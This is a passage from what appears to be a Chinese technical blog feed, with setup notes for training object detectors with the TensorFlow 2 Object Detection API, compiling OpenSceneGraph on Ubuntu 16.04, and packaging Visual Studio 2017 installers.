<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;tensorflow&#x2F;models</span><br></pre></td></tr></table></figure>

<h3 id="安装TensorFlow-Models中的Object-Detection-模块"><a href="#安装TensorFlow-Models中的Object-Detection-模块" class="headerlink" title="安装TensorFlow Models中的Object Detection 模块"></a>安装TensorFlow Models中的Object Detection 模块</h3><p>存在两种安装TensorFlow Models中的Object Detection 模块的方法，如下所示：</p>
<ul>
<li>配置目标检测API目录，以便python能找到object detect api。使用pth文件，将object detect模块的路径添加到python模块的搜索路径中。在python安装目录的Lib\site-packages下创建tensorflow.pth文件，在其中添加Object Detection API文件路径：</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 创建tensorflow.pth文件，输入如下内容</span><br><span class="line">J:\tensorflow\models</span><br><span class="line">J:\tensorflow\models\research</span><br><span class="line">J:\tensorflow\models\research\object_detection</span><br><span class="line">J:\tensorflow\models\research\slim</span><br></pre></td></tr></table></figure>

<ul>
<li>安装目标检测API。两种方法二选一即可。</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># From within TensorFlow&#x2F;models&#x2F;research&#x2F;</span><br><span class="line">cp object_detection&#x2F;packages&#x2F;tf2&#x2F;setup.py .</span><br><span class="line">pip install -e . -i https:&#x2F;&#x2F;pypi.tuna.tsinghua.edu.cn&#x2F;simple&#x2F;</span><br></pre></td></tr></table></figure>

<h3 id="安装Protobuf，生成python语言的消息协议"><a href="#安装Protobuf，生成python语言的消息协议" class="headerlink" title="安装Protobuf，生成python语言的消息协议"></a>安装Protobuf，生成python语言的消息协议</h3><p>安装Protobuf的过程具体参考<a href="https://blog.51cto.com/stq054188/2891184" target="_blank" rel="noopener">TensorFlow2.x目标检测API安装配置步骤详细教程 Object Detection API with TensorFlow2.x </a>。</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd models&#x2F;research&#x2F;</span><br><span class="line">protoc&#x2F;bin&#x2F;protoc object_detection&#x2F;protos&#x2F;*.proto --python_out&#x3D;.</span><br></pre></td></tr></table></figure>

<h3 id="测试tf-object-detect-api，并安装缺失模块。"><a href="#测试tf-object-detect-api，并安装缺失模块。" class="headerlink" title="测试tf object detect api，并安装缺失模块。"></a>测试tf object detect api，并安装缺失模块。</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># 测试tf object detect api</span><br><span class="line">python object_detection&#x2F;builders&#x2F;model_builder_tf2_test.py</span><br><span class="line"></span><br><span class="line"># 根据上述测试脚本提示，安装缺失模块</span><br><span class="line">pip install tf-slim</span><br><span class="line">pip install scipy</span><br><span class="line">pip install tensorflow_io</span><br><span class="line">pip install matplotlib</span><br><span class="line">pip install pyyaml</span><br></pre></td></tr></table></figure>

<h1 id="开源数据集"><a href="#开源数据集" class="headerlink" title="开源数据集"></a>开源数据集</h1><p>数据集是进行深度学习的前提和基础。</p>
<h2 id="Oxford-IIIT-宠物数据集"><a href="#Oxford-IIIT-宠物数据集" class="headerlink" title="Oxford-IIIT 宠物数据集"></a>Oxford-IIIT 宠物数据集</h2><p>我们创建了一个包含 37 个类别的宠物数据集，每个类别大约有 200 张图像。这些图像在比例、姿势和照明方面有很大的变化。所有图像都有相关的品种、头部 ROI 和像素级三元图分割的地面实况注释。</p>
<p>具体下载地址请参考<a href="https://www.robots.ox.ac.uk/~vgg/data/pets/" target="_blank" rel="noopener">Oxford-IIIT 宠物数据集</a>。</p>
<h2 id="COCO数据集"><a href="#COCO数据集" class="headerlink" title="COCO数据集"></a>COCO数据集</h2><p>MS COCO的全称是Microsoft Common Objects in Context，起源于微软于2014年出资标注的Microsoft COCO数据集，与ImageNet竞赛一样，被视为是计算机视觉领域最受关注和最权威的比赛之一。 </p>
<p>COCO数据集是一个大型的、丰富的物体检测，分割和字幕数据集。这个数据集以scene understanding为目标，主要从复杂的日常场景中截取，图像中的目标通过精确的segmentation进行位置的标定。图像包括91类目标，328,000影像和2,500,000个label。目前为止有语义分割的最大数据集，提供的类别有80 类，有超过33 万张图片，其中20 万张有标注，整个数据集中个体的数目超过150 万个。</p>
<h3 id="COCO数据集使用"><a href="#COCO数据集使用" class="headerlink" title="COCO数据集使用"></a>COCO数据集使用</h3><p>请参考<a href="https://www.cnblogs.com/Meumax/p/12021913.html" target="_blank" rel="noopener">COCO数据集使用</a>。</p>
<h3 id="COCOAPI"><a href="#COCOAPI" class="headerlink" title="COCOAPI"></a>COCOAPI</h3><p>完整的COCO数据集有十几个G大小，我们没有必要全部下载下来，只需要下载自己感兴趣的类别图像即可。这时就需要使用COCOAPI。</p>
<p>COCO API 协助加载、解析和可视化 COCO 中的注释。API 支持多种注释格式（请参见数据格式页面）。</p>
<ul>
<li>下载cocoapi</li>
</ul>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">git clone https:&#x2F;&#x2F;github.com&#x2F;cocodataset&#x2F;cocoapi.git</span><br></pre></td></tr></table></figure>

<ul>
<li>pythonapi安装</li>
</ul>
<p>进入COCOAPI的PythonAPI文件夹，输入如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python setup.py build_ext install</span><br></pre></td></tr></table></figure>

<p>安装错误解决方法请参考<a href="https://blog.csdn.net/weixin_41010198/article/details/94053130" target="_blank" rel="noopener">错误：cl: 命令行 error D8021 :无效的数值参数“/Wno-cpp”</a>。</p>
<h1 id="模型训练"><a href="#模型训练" class="headerlink" title="模型训练"></a>模型训练</h1><h2 id="准备数据集"><a href="#准备数据集" class="headerlink" title="准备数据集"></a>准备数据集</h2><h3 id="注解数据集"><a href="#注解数据集" class="headerlink" title="注解数据集"></a>注解数据集</h3><h4 id="安装LabelImg工具"><a href="#安装LabelImg工具" class="headerlink" title="安装LabelImg工具"></a>安装LabelImg工具</h4><p>LabelImg 是一个图形图像标注工具。它是用 Python 编写的，并使用 Qt 作为其图形界面。</p>
<p>注释以 PASCAL VOC 格式保存为 XML 文件，这是ImageNet使用的格式。此外，它还支持 YOLO 和 CreateML 格式。</p>
<p>可以从LabelImg的官方存储库<a href="https://github.com/tzutalin/labelImg" target="_blank" rel="noopener">labelImg</a>中下载最新的LabelImg工具。</p>
<h3 id="使用K折交叉验证分区数据集"><a href="#使用K折交叉验证分区数据集" class="headerlink" title="使用K折交叉验证分区数据集"></a>使用K折交叉验证分区数据集</h3><p>可使用python脚本，请参考<a href="https://tensorflow-object-detection-api-tutorial.readthedocs.io/en/latest/training.html" target="_blank" rel="noopener">partition_dataset.py</a>。</p>
<h3 id="创建标签映射"><a href="#创建标签映射" class="headerlink" title="创建标签映射"></a>创建标签映射</h3><p>TensorFlow 需要一个标签映射，即将每个使用的标签映射到一个整数值。此标签图用于训练和检测过程。</p>
<p>下面我们展示一个示例标签映射（例如label_map.pbtxt），假设我们的数据集包含 2 个标签，dogs并且cats：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">item &#123;</span><br><span class="line">    id: 1</span><br><span class="line">    name: &#39;cat&#39;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">item &#123;</span><br><span class="line">    id: 2</span><br><span class="line">    name: &#39;dog&#39;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>标签地图文件有扩展.pbtxt名，应该放在training_demo/annotations文件夹内。</p>
<h3 id="创建TensorFlow-Records文件"><a href="#创建TensorFlow-Records文件" class="headerlink" title="创建TensorFlow Records文件"></a>创建TensorFlow Records文件</h3><p>TFRecord 是Google官方推荐的一种数据格式，是Google专门为TensorFlow设计的一种数据格式。通过将训练数据或测试数据打包成TFRecord文件，就可以配合TF中相关的DataLoader / Transformer等API实现数据的加载和处理，便于高效地训练和评估模型。</p>
<p>实际上，TFRecord是一种二进制文件，其能更好的利用内存，其内部包含了多个tf.train.Example， 而Example是protocol buffer(protobuf) 数据标准的实现，在一个Example消息体中包含了一系列的tf.train.feature属性，而 每一个feature 是一个key-value的键值对，其中，key 是string类型，而value 的取值有三种：</p>
<ul>
<li>bytes_list: 可以存储string 和byte两种数据类型。</li>
<li>float_list: 可以存储float(float32)与double(float64) 两种数据类型 。</li>
<li>int64_list: 可以存储：bool, enum, int32, uint32, int64, uint64 。</li>
</ul>
<h2 id="重用预训练模型"><a href="#重用预训练模型" class="headerlink" title="重用预训练模型"></a>重用预训练模型</h2><h3 id="下载预训练模型"><a href="#下载预训练模型" class="headerlink" title="下载预训练模型"></a>下载预训练模型</h3><p>从此处<a href="https://github.com/tensorflow/models/blob/master/research/object_detection/g3doc/tf2_detection_zoo.md" target="_blank" rel="noopener">TensorFlow 2 Detection Model Zoo</a>选择预训练模型下载。此处下载<a href="http://download.tensorflow.org/models/object_detection/tf2/20200711/ssd_resnet50_v1_fpn_640x640_coco17_tpu-8.tar.gz" target="_blank" rel="noopener">SSD ResNet50 V1 FPN 640x640 </a>模型。</p>
<h3 id="重新配置训练管线"><a href="#重新配置训练管线" class="headerlink" title="重新配置训练管线"></a>重新配置训练管线</h3><p>修改模型文件夹下的pipeline.config文件，用于训练自己的模型。以SSD ResNet50 V1 FPN 640x640模型的pipeline.config文件为例，具体些修改内容如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">model &#123;</span><br><span class="line">  ssd &#123;</span><br><span class="line">    num_classes: 1 &#x2F;&#x2F; 此时修改模型输出类别数量</span><br><span class="line">    image_resizer &#123;</span><br><span class="line">      fixed_shape_resizer &#123;</span><br><span class="line">        height: 640</span><br><span class="line">        width: 640</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    ...</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">train_config &#123;</span><br><span class="line">  batch_size: 4 &#x2F;&#x2F; 根据GPU显卡或内存大小设置合适的批处理大小</span><br><span class="line">  data_augmentation_options &#123;</span><br><span class="line">    random_horizontal_flip &#123;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  data_augmentation_options &#123;</span><br><span class="line">    random_crop_image &#123;</span><br><span class="line">      min_object_covered: 0.0</span><br><span class="line">      min_aspect_ratio: 0.75</span><br><span class="line">      max_aspect_ratio: 3.0</span><br><span class="line">      min_area: 0.75</span><br><span class="line">      max_area: 1.0</span><br><span class="line">      overlap_thresh: 0.0</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  ...</span><br><span class="line">  fine_tune_checkpoint: &quot;J:&#x2F;tensorflow&#x2F;workspace&#x2F;training_demo&#x2F;pre-trained-models&#x2F;ssd_resnet50_v1_fpn_640x640_coco17_tpu-8&#x2F;checkpoint&#x2F;ckpt-0&quot; &#x2F;&#x2F; 原模型的checkpoint</span><br><span class="line">  num_steps: 25000</span><br><span class="line">  startup_delay_steps: 0.0</span><br><span class="line">  replicas_to_aggregate: 8</span><br><span class="line">  max_number_of_boxes: 100</span><br><span class="line">  unpad_groundtruth_tensors: false</span><br><span class="line">  fine_tune_checkpoint_type: &quot;detection&quot; &#x2F;&#x2F; 为目标检测任务修改此处</span><br><span class="line">  use_bfloat16: false</span><br><span class="line">  fine_tune_checkpoint_version: V2</span><br><span class="line">&#125;</span><br><span class="line">train_input_reader &#123;</span><br><span class="line">  label_map_path: &quot;J:&#x2F;tensorflow&#x2F;workspace&#x2F;training_demo&#x2F;annotations&#x2F;label_map.pbtxt&quot; &#x2F;&#x2F; 标签映射文件路径</span><br><span class="line">  tf_record_input_reader &#123;</span><br><span class="line">    input_path: &quot;J:&#x2F;tensorflow&#x2F;workspace&#x2F;training_demo&#x2F;annotations&#x2F;train.record&quot; &#x2F;&#x2F; 用于训练的tfrecord文件路径</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">eval_config &#123;</span><br><span class="line">  metrics_set: &quot;coco_detection_metrics&quot;</span><br><span class="line">  use_moving_averages: false</span><br><span class="line">&#125;</span><br><span class="line">eval_input_reader &#123;</span><br><span class="line">  label_map_path: &quot;J:&#x2F;tensorflow&#x2F;workspace&#x2F;training_demo&#x2F;annotations&#x2F;label_map.pbtxt&quot; &#x2F;&#x2F; 标签映射文件路径</span><br><span class="line">  shuffle: false</span><br><span class="line">  num_epochs: 1</span><br><span class="line">  tf_record_input_reader &#123;</span><br><span class="line">    input_path: &quot;J:&#x2F;tensorflow&#x2F;workspace&#x2F;training_demo&#x2F;annotations&#x2F;val.record&quot; &#x2F;&#x2F; 用于验证的tfrecord文件路径</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h2 id="训练新模型"><a href="#训练新模型" class="headerlink" title="训练新模型"></a>训练新模型</h2><h3 id="准备训练模型"><a href="#准备训练模型" class="headerlink" title="准备训练模型"></a>准备训练模型</h3><p>将TensorFlow/models/research/object_detection/model_main_tf2.py文件粘贴到training_demo文件夹。该文件是训练和评估新模型的入口文件。</p>
<h3 id="训练模型"><a href="#训练模型" class="headerlink" title="训练模型"></a>训练模型</h3><p>使用如下命令开始训练新模型：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd J:\tensorflow\workspace\training_demo</span><br><span class="line">python model_main_tf2.py --model_dir J:\tensorflow\workspace\training_demo\models\my_ssd_resnet50_v1_fpn --pipeline_config_path J:\tensorflow\workspace\training_demo\models\my_ssd_resnet50_v1_fpn\pipeline.config</span><br></pre></td></tr></table></figure>

<p><em>注意：此处参数–model_dir是模型输出目录，除了存在pipeline.config外，应该是空的。*</em>否则将发生错误<a href="https://github.com/tensorflow/models/issues/9703" target="_blank" rel="noopener">Pretrained Models number of classes doesnt match own dataset number of classes : Cannot assign to variable</a>。</p>
<h3 id="评估模型"><a href="#评估模型" class="headerlink" title="评估模型"></a>评估模型</h3><p>使用如下命令评估训练好的模型：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd J:\tensorflow\workspace\training_demo</span><br><span class="line">python model_main_tf2.py --model_dir J:\tensorflow\workspace\training_demo\models\my_ssd_resnet50_v1_fpn --pipeline_config_path J:\tensorflow\workspace\training_demo\models\my_ssd_resnet50_v1_fpn\pipeline.config --checkpoint_dir J:\tensorflow\workspace\training_demo\models\my_ssd_resnet50_v1_fpn</span><br></pre></td></tr></table></figure>

<h3 id="监控训练作业进度"><a href="#监控训练作业进度" class="headerlink" title="监控训练作业进度"></a>监控训练作业进度</h3><p>使用如下命令监控模型训练进度：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd J:\tensorflow\workspace\training_demo</span><br><span class="line">tensorboard --logdir&#x3D;models&#x2F;my_ssd_resnet50_v1_fpn</span><br></pre></td></tr></table></figure>

<p>上面的命令将启动一个新的 TensorBoard 服务器，它（默认）监听你机器的 6006 端口。完成此操作后，转到您的浏览器并<a href="http://localhost:6006/在地址栏中输入，然后您应该会看到一个仪表板（如果您的模型刚刚开始训练，可能会显示较少）。" target="_blank" rel="noopener">http://localhost:6006/在地址栏中输入，然后您应该会看到一个仪表板（如果您的模型刚刚开始训练，可能会显示较少）。</a></p>
<h3 id="导出训练模型"><a href="#导出训练模型" class="headerlink" title="导出训练模型"></a>导出训练模型</h3><p>训练工作完成后，使用如下步骤导出模型：</p>
<p>（1）复制TensorFlow/models/research/object_detection/exporter_main_v2.py脚本并将其直接粘贴到您的training_demo文件夹中。</p>
<p>（2）运行如下命令：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">cd J:\tensorflow\workspace\training_demo</span><br><span class="line">python exporter_main_v2.py --input_type image_tensor --pipeline_config_path .\models\my_ssd_resnet50_v1_fpn\pipeline.config --trained_checkpoint_dir .\models\my_ssd_resnet50_v1_fpn --output_directory .\exported-models\my_ssd_resnet50_v1_fpn</span><br></pre></td></tr></table></figure>

<h1 id="评价指标"><a href="#评价指标" class="headerlink" title="评价指标"></a>评价指标</h1><p>对于一个目标检测模型的好坏，总的来说可以从以下三个方面来评估：</p>
<ul>
<li>分类的精度如何。一般可以用准确度（Accuracy），精度（Precision），召回率（Recall Rate）， PR 曲线，AP，mAP等</li>
<li>定位的精度如何。比如 IoU</li>
<li>运行的速度如何。比如 fps，一秒处理几张图。</li>
</ul>
<p>具体内容请参考<a href="https://blog.csdn.net/kuweicai/article/details/105082446" target="_blank" rel="noopener">目标检测模型的评价指标(Acc, Precision, Recall, AP, mAP, RoI)</a>。</p>
<h1 id="参考文献"><a href="#参考文献" class="headerlink" title="参考文献"></a>参考文献</h1><ol>
<li><a href="https://github.com/tensorflow/models/tree/master/research/object_detection" target="_blank" rel="noopener">TensorFlow Object Detection API</a>,by tensorflow.</li>
<li><a href="https://blog.csdn.net/stq054188/article/details/109462843" target="_blank" rel="noopener">TensorFlow2.x GPU版安装与CUDA版本选择指南</a>,by Color_Space.</li>
<li><a href="https://www.tensorflow.org/install/source_windows" target="_blank" rel="noopener">在 Windows 环境中从源代码构建</a>,by tensorflow.</li>
<li><a href="https://blog.csdn.net/W1995S/article/details/113123127" target="_blank" rel="noopener">COCO2014/2017数据集</a>,by THE@JOKER.</li>
<li><a href="https://cloud.tencent.com/developer/article/1745147" target="_blank" rel="noopener">TensorFlow2.x目标检测API测试代码使用演示</a>,by Color Space.</li>
<li><a href="https://blog.51cto.com/stq054188/2891184" target="_blank" rel="noopener">TensorFlow2.x目标检测API安装配置步骤详细教程 Object Detection API with TensorFlow2.x </a>,by Color_Space.</li>
<li><a href="https://blog.csdn.net/cc1949/article/details/78286224" target="_blank" rel="noopener">python安装第三方包的安装路径，dist-packages和site-packages区别</a>,by 陈 超.</li>
<li><a href="https://yanbin.blog/pth-file-append-python-module-search-path/" target="_blank" rel="noopener">用 .pth 文件附加 Python 模块搜索路径</a>,by 隔叶黄莺.</li>
<li><a href="https://www.jianshu.com/p/b723053a86a6" target="_blank" rel="noopener">Google Protobuf简明教程</a>,by geekpy.</li>
<li><a href="https://medium.com/analytics-vidhya/tensorflow-gpu-how-to-install-tensorflow-with-nvidia-cuda-cudnn-and-gpu-support-on-windows-6158cffc1c29" target="_blank" rel="noopener">Tensorflow-GPU: How to Install Tensorflow with NVIDIA CUDA,cuDNN and GPU support on Windows</a>,by Ilekura Idowu.</li>
<li><a href="https://blog.csdn.net/qq_41185868/article/details/82939959" target="_blank" rel="noopener">Dataset之COCO数据集：COCO数据集的简介、下载、使用方法之详细攻略</a>,by 一个处女座的程序猿.</li>
<li><a href="https://zhuanlan.zhihu.com/p/29393415" target="_blank" rel="noopener">COCO数据集的标注格式</a>,by Gemfield.</li>
<li><a href="https://cloud.videojj.com/bbs/topic/112/coco%E6%95%B0%E6%8D%AE%E9%9B%86%E6%A0%87%E6%B3%A8%E8%AF%A6%E8%A7%A3" target="_blank" rel="noopener">COCO数据集标注详解</a>,by 2044914130.</li>
<li><a href="https://www.aiuai.cn/aifarm1306.html" target="_blank" rel="noopener">RLE格式分割标注文件表示</a>,by AIHGF.</li>
<li><a href="https://tensorflow-object-detection-api-tutorial.readthedocs.io/en/latest/index.html" target="_blank" rel="noopener">TensorFlow 2 Object Detection API tutorial</a>,by github.</li>
<li><a href="https://xmfbit.github.io/2020/04/03/tfrecord-introduction/" target="_blank" rel="noopener">TFRecord 简介</a>,by xmfbit.</li>
<li><a href="https://johnlekberg.com/blog/2020-03-11-regex-flags.html" target="_blank" rel="noopener">Using regular expression flags in Python</a>,by John Lekberg.</li>
<li><a href="https://blog.csdn.net/weixin_41010198/article/details/94053130" target="_blank" rel="noopener">错误：cl: 命令行 error D8021 :无效的数值参数“/Wno-cpp”</a>,by 点亮～黑夜.</li>
<li><a href="https://www.cnblogs.com/Meumax/p/12021913.html" target="_blank" rel="noopener">COCO数据集使用</a>,by Meumax-GDUT.</li>
<li><a href="https://arleyzhang.github.io/articles/1dc20586/" target="_blank" rel="noopener">目标检测数据集PASCAL VOC简介</a>,by arleyzhang.</li>
<li><a href="https://towardsdatascience.com/building-a-toy-detector-with-tensorflow-object-detection-api-63c0fdf2ac95" target="_blank" rel="noopener">Building a Toy Detector with Tensorflow Object Detection API</a>,by Priya Dwivedi.</li>
<li><a href="https://blog.csdn.net/TwT520Ly/article/details/79759448" target="_blank" rel="noopener">【Tensorflow】tf.app.run()与命令行参数解析</a>,by TwT520Ly.</li>
<li><a href="https://zessay.github.io/622148840/" target="_blank" rel="noopener">关于TFRecords和tf.Example的使用</a>,by Zessay.</li>
<li><a href="https://zhuanlan.zhihu.com/p/101284491" target="_blank" rel="noopener">Pandas教程 | 超好用的Groupby用法详解</a>,by 易执.</li>
<li><a href="https://www.jianshu.com/p/25cb6d79d8f9" target="_blank" rel="noopener">Pandas组合操作</a>,by lysh1987.</li>
<li><a href="https://blog.alexanderliu.top/posts/tensorflow-input-format-tfrecord.html" target="_blank" rel="noopener">TensorFlow 数据输入格式之 TFRecord</a>,by 逑识.</li>
<li><a href="https://laddiexu.github.io/tech/2017/11/04/TF-ODYourData.html" target="_blank" rel="noopener">使用 Tensorflow Object Detection API 训练自己的模型</a>,by 菁菁者莪.</li>
<li><a href="https://blog.csdn.net/weixin_36558054/article/details/103119691" target="_blank" rel="noopener">tensorflow出现显存不足的提示</a>,by 楠仔码头.</li>
<li><a href="https://blog.csdn.net/flyfish1986/article/details/104513632" target="_blank" rel="noopener">使用COCOAPI操作COCO数据集 遇到的问题 TypeError: ‘numpy.float64’ object cannot be interpreted</a>,by TheOldManAndTheSea.</li>
<li><a href="https://github.com/tensorflow/models/issues/9703" target="_blank" rel="noopener">Pretrained Models number of classes doesnt match own dataset number of classes : Cannot assign to variable</a>,by tensorflow.</li>
<li><a href="https://stackoverflow.com/questions/63552169/some-python-objects-were-not-bound-to-checkpointed-values" target="_blank" rel="noopener">Some Python objects were not bound to checkpointed values</a>,by stackoverflow.</li>
<li><a href="https://blog.csdn.net/kuweicai/article/details/105082446" target="_blank" rel="noopener">目标检测模型的评价指标(Acc, Precision, Recall, AP, mAP, RoI)</a>,by kuweicai.</li>
<li><a href="https://blog.csdn.net/xiangxianghehe/article/details/118380755" target="_blank" rel="noopener">tensorflow2转tflite提示OP不支持的解决方案</a>,by nudt_qxx.</li>
<li><a href="https://stackoverflow.com/questions/56298451/modulenotfounderror-no-module-named-gin" target="_blank" rel="noopener">ModuleNotFoundError: No module named ‘gin’</a>,by stackoverflow.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>计算机图形学</tag>
        <tag>计算机视觉</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu16.04编译安装OSG</title>
    <url>/2019/09/14/Ubuntu16-04%E7%BC%96%E8%AF%91%E5%AE%89%E8%A3%85OSG/</url>
    <content><![CDATA[<p>OpenSceneGraph是一个开源高性能3D图形工具包，应用程序开发人员在视觉模拟，游戏，虚拟现实，科学可视化和建模等领域使用。 它完全使用标准C ++和OpenGL编写，可在所有Windows平台，OSX，GNU / Linux，IRIX，Solaris，HP-Ux，AIX和FreeBSD操作系统上运行。 OpenSceneGraph现已成为世界领先的场景图技术，广泛应用于视觉，空间，科学，石油天然气，游戏和虚拟现实行业。本文主要记录在Ubuntu 16.04下编译安装OpenSceneGraph的过程。</p>
<h1 id="下载OSG源代码"><a href="#下载OSG源代码" class="headerlink" title="下载OSG源代码"></a>下载OSG源代码</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># cd ~&#x2F;software</span><br><span class="line"># git clone https:&#x2F;&#x2F;github.com&#x2F;openscenegraph&#x2F;OpenSceneGraph.git</span><br><span class="line"># git checkout OpenSceneGraph-3.6.4</span><br></pre></td></tr></table></figure>

<h1 id="下载安装依赖"><a href="#下载安装依赖" class="headerlink" title="下载安装依赖"></a>下载安装依赖</h1><h2 id="安装OSG编译所需依赖"><a href="#安装OSG编译所需依赖" class="headerlink" title="安装OSG编译所需依赖"></a>安装OSG编译所需依赖</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># sudo apt-get build-dep openscenegraph</span><br></pre></td></tr></table></figure>

<h2 id="下载OSG数据资源"><a href="#下载OSG数据资源" class="headerlink" title="下载OSG数据资源"></a>下载OSG数据资源</h2><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># cd ~&#x2F;software</span><br><span class="line"># wget http:&#x2F;&#x2F;www.openscenegraph.org&#x2F;downloads&#x2F;stable_releases&#x2F;OpenSceneGraph-3.4.0&#x2F;data&#x2F;OpenSceneGraph-Data-3.4.0.zip</span><br><span class="line"># unzip OpenSceneGraph-Data-3.4.0.zip</span><br></pre></td></tr></table></figure>

<h1 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h1><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line"># cd ~&#x2F;software&#x2F;openscenegraph</span><br><span class="line"># cmake .</span><br><span class="line"># make</span><br><span class="line"># sudo make install</span><br><span class="line"># sudo ldconfig -v &#x2F;&#x2F;如找不到相关osg库，可运行该命令</span><br></pre></td></tr></table></figure>

<h1 id="运行示例"><a href="#运行示例" class="headerlink" title="运行示例"></a>运行示例</h1><p>编辑.bashrc文件，添加如下环境变量：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">export PATH&#x3D;$&#123;PATH&#125;:&#x2F;home&#x2F;myaccount&#x2F;software&#x2F;OpenSceneGraph&#x2F;bin</span><br><span class="line">export LD_LIBRARY_PATH&#x3D;$&#123;LD_LIBRARY_PATH&#125;:&#x2F;home&#x2F;myaccount&#x2F;software&#x2F;OpenSceneGraph&#x2F;lib</span><br><span class="line">export OSG_FILE_PATH&#x3D;&#x2F;home&#x2F;myaccount&#x2F;software&#x2F;OpenSceneGraph-Data:&#x2F;home&#x2F;myaccount&#x2F;OpenSceneGraph-Data&#x2F;Images</span><br></pre></td></tr></table></figure>

<p>使用如下命令运行示例：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sh .&#x2F;runexamples.bat</span><br></pre></td></tr></table></figure>

<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="http://www.openscenegraph.org/index.php/documentation/getting-started" target="_blank" rel="noopener">Getting Started</a>,by OpenSceneGraph.</li>
<li><a href="https://blog.csdn.net/qing101hua/article/details/53080274" target="_blank" rel="noopener">ubuntu 环境 安装OSG</a>,by qing101hua.</li>
<li><a href="http://www.openscenegraph.org/index.php/download-section/data" target="_blank" rel="noopener">OSG Data Resources</a>,by OpenSceneGraph.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>3D</tag>
        <tag>计算机图形学</tag>
      </tags>
  </entry>
  <entry>
    <title>VS2017打包Windows桌面程序</title>
    <url>/2019/09/26/VS2017%E6%89%93%E5%8C%85Windows%E6%A1%8C%E9%9D%A2%E7%A8%8B%E5%BA%8F/</url>
    <content><![CDATA[<p>Microsoft Visual Studio 2017 Installer Projects是一个易于发布 VS 项目的官方插件，下面简要介绍该插件的使用。</p>
<h1 id="安装插件"><a href="#安装插件" class="headerlink" title="安装插件"></a>安装插件</h1><p>VS 工具栏 &gt; 工具 &gt; 扩展和更新 &gt; 联机 &gt; 搜索 Microsoft Visual Studio 2017 Installer Projects 并安装。安装完成后需要重启 VS。</p>
<h1 id="添加-Setup-Project"><a href="#添加-Setup-Project" class="headerlink" title="添加 Setup Project"></a>添加 Setup Project</h1><p>打开VS2017，新建Setup Project。</p>
<h1 id="配置安装项目"><a href="#配置安装项目" class="headerlink" title="配置安装项目"></a>配置安装项目</h1><h2 id="设置Setup-Project"><a href="#设置Setup-Project" class="headerlink" title="设置Setup Project"></a>设置Setup Project</h2><p>选中添加的Setup Project，配置其属性。比较重要的属性有：</p>
<table>
<thead>
<tr>
<th>key</th>
<th>val</th>
</tr>
</thead>
<tbody><tr>
<td>Author</td>
<td>一般填公司名，会使用其作为软件安装目录名</td>
</tr>
<tr>
<td>Localization</td>
<td>指定软件运行地语种，如果你的软件是多语言的话</td>
</tr>
<tr>
<td>TargetPlatform</td>
<td>指定软件目标平台 x86 or x64</td>
</tr>
<tr>
<td>Version</td>
<td>发布版本号</td>
</tr>
</tbody></table>
<h2 id="桌面快捷方式"><a href="#桌面快捷方式" class="headerlink" title="桌面快捷方式"></a>桌面快捷方式</h2><h2 id="开始菜单快捷方式"><a href="#开始菜单快捷方式" class="headerlink" title="开始菜单快捷方式"></a>开始菜单快捷方式</h2><h2 id="设置快捷方式Icon"><a href="#设置快捷方式Icon" class="headerlink" title="设置快捷方式Icon"></a>设置快捷方式Icon</h2><h2 id="生成安装文件-msi"><a href="#生成安装文件-msi" class="headerlink" title="生成安装文件.msi"></a>生成安装文件.msi</h2><h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><ol>
<li><a href="https://www.jianshu.com/p/514fc27d8bf3" target="_blank" rel="noopener">Microsoft Visual Studio 2017 Installer Projects</a>,by SkyRiN.</li>
<li><a href="https://blog.csdn.net/jxyb2012/article/details/83009765" target="_blank" rel="noopener">Vistual Studio Community 2017 30天许可证过期</a>,by 井底一蛤蟆.</li>
</ol>
]]></content>
      <tags>
        <tag>笔记本</tag>
        <tag>C/C++</tag>
      </tags>
  </entry>
  <entry>
    <title>Ubuntu_16.04安装OpenCV的方法</title>
    <url>/2019/04/28/Ubuntu-16-04%E5%AE%89%E8%A3%85opencv%E7%9A%84%E6%96%B9%E6%B3%95/</url>
    <content><![CDATA[<p>本文记录在Ubuntu16.04 LTS操作系统中从源代码编译安装OpenCV的过程。</p>
